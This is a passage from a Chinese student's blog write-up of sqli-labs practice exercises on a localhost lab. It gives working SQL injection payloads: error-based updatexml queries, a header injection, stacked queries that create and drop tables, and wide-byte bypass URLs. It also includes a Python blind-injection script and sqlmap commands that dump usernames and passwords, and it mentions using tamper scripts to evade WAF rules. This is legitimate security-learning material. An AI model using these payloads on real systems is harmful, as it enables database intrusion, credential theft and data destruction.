+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dumb&quot; and updatexml(&#x27;error&#x27;,concat(&#x27;~&#x27;,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1)),&quot;error&quot;) -- &amp;passwd=Dumb&amp;sumbit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/135.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-15(用基于布尔的盲注)</strong></li>
+</ul>
+<p>这里和第八题的方法是一样的，唯一的不同就是构造Get和Post的区别，然后还是写个脚本就跑出了所有的数据了，不得不说Python功能性还是比C++要强很多的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">Right=<span class="string">&quot;flag.jpg&quot;</span></span><br><span class="line">URL=<span class="string">&quot;http://localhost/sqli-labs/Less-15/&quot;</span></span><br><span class="line">Data=&#123;<span class="string">&#x27;uname&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;Dumb&#x27;</span>,<span class="string">&#x27;sumbit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">Verifystring=<span class="string">&quot;Dumb&#x27; and left(%s,%d)=&#x27;%s&#x27;&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot;Dumb&#x27; and length(concat(%s,&#x27;1&#x27;))=%d&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;Dumb&#x27; and concat((select count(*) from users))=%d -- &quot;</span>%i</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            Data[<span class="string">&#x27;uname&#x27;</span>]=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            Respond=requests.post(url=URL,data=Data)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try                           </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            Data[<span class="string">&#x27;uname&#x27;</span>]=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            Respond=requests.post(url=URL,data=Data)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/136.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-18</strong></li>
+</ul>
+<p>只要修改limit范围就可以得到所有的数据。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1)),1) and &#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/137.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-38</strong></li>
+</ul>
+<p>堆叠注入，就建立一个表然后再删除吧。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-38/?id=1%27;%20create%20table%20new%20like%20users%20--%20</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-38/?id=1%27;%20drop%20table%20new%20--%20</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>结合所学知识,尝试用自己的语言来描述如何防范/修复sql注入?</strong></li>
+</ol>
+<ul>
+<li>过滤关键词，防范各种可能的注入。</li>
+<li>预编译SQL语句，比如参数化查询。</li>
+</ul>
+<h2 id="提升："><a href="#提升：" class="headerlink" title="提升："></a>提升：</h2><ul>
+<li><strong>了解github并创建属于自己的账号(很多东西我们都能在github上找到,如sqli-labs,sqlmap等)</strong></li>
+</ul>
+<p>已经创建了：<a target="_blank" rel="noopener" href="https://github.com/Administrator-Xorex">https://github.com/Administrator-Xorex</a></p>
+<ul>
+<li><strong>了解sqlmap,尝试使用此工具对sqli-labs靶场中的Less-1,Less-5进行攻击,并了解sqlmap中关于tamper有关的知识</strong></li>
+</ul>
+<ol>
+<li><strong>Less-1:</strong></li>
+</ol>
+<p>首先使用sqlmap对less-1进行扫描，发现了可以进行四种注入：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> -<span class="literal">-banner</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/138.png" alt="image.png"></p>
+<p>然后就可以一步一步获得数据了：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> -<span class="literal">-dbs</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security -<span class="literal">-tables</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users -<span class="literal">-columns</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> username,password -<span class="literal">-dump</span></span><br></pre></td></tr></table></figure>
+<p>最后成功获得数据并保存：</p>
+<p><img src="https://xorex.space/image/139.png" alt="image.png"></p>
+<ol start="2">
+<li><strong>Less-5:</strong></li>
+</ol>
+<p>和上面的Less-1过程相同，不过这次测出来的注入就少了联合查询，最后也能搞到数据。</p>
+<p><img src="https://xorex.space/image/140.png" alt="image.png"></p>
+<ol start="3">
+<li><strong>Tamper</strong></li>
+</ol>
+<p>可以一定程度上绕过的字符过滤，WAF规则的阻挡，从而进行攻击。</p>
+<ul>
+<li><strong>了解sql注入的过滤及绕过,尝试完成Less-33,Less-36</strong></li>
+</ul>
+<ol>
+<li><strong>Less-33:</strong></li>
+</ol>
+<p>宽字符注入，因为这道题将输入的’加了一个反斜杠，只需要用宽字符吃掉这个反斜杠即可形成闭合：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-33/?id=0%df%27%20union%20select%201,(select%20group_concat(username)%20from%20users),(select%20group_concat(password)%20from%20users)%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/141.png" alt="image.png"></p>
+<ol start="2">
+<li><strong>Less-36:</strong></li>
+</ol>
+<p>这个和33是一样的，都是宽字节注入。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-36/?id=0%ee%27%20union%20select%201,(select%20group_concat(username)%20from%20users),(select%20group_concat(password)%20from%20users)%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/142.png" alt="image.png"></p>
+<ul>
+<li><p><strong>尝试阅读sqli-labs中的源码(需PHP要有一定的PHP功底,接下来会学习),结合所学知识从代码角度分析sql注入产生的原因</strong></p>
+</li>
+<li><p>正在尝试学习PHP中……</p>
+</li>
+</ul>
+<h2 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h2><ul>
+<li><strong>感谢学长们的Web学习计划第二期！！！</strong></li>
+<li><strong>配环境好麻烦啊，尤其是不知道哪里出问题的那种 QAQ</strong></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Xorex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xorex.space/2020/09/29/88da8982a4e7/">https://xorex.space/2020/09/29/88da8982a4e7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xorex.space" target="_blank">Xorex</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8A%A5%E5%91%8A/">报告</a></div><div class="post_share"><div class="social-share" data-image="/waifus/049.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/10/09/3d277be41011/"><img class="prev-cover" src="/waifus/007.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">C语言题库</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/29/a0feb4d574d4/"><img class="next-cover" src="/waifus/047.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Sql-libs注入WriteUp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC8yODcyMS81Mjky"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/Megumi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Xorex</div><div class="author-info__description">热爱每一天的生活！</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">119</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">95</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Administrator-Xorex"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Administrator-Xorex" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="http://tool.gljlw.com/qq/?qq=2676424606" target="_blank" title="添加好友"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:cloudloverain@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/65831075" target="_blank" title="bilibili"><i class="fas fa-tv"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">URL&#x2F;HTTP请求方法相关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">SQL注入相关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">提升：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">最后：</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2021 By Xorex</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadLivere () {
+  if (typeof LivereTower === 'object') {
+    window.LivereTower.init()
+  }
+  else {
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+  }
+}
+
+if ('Livere' === 'Livere' || !false) {
+  if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+  else loadLivere()
+}
+else {
+  function loadOtherComment () {
+    loadLivere()
+  }
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="Xorex" data-fontsize="18px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
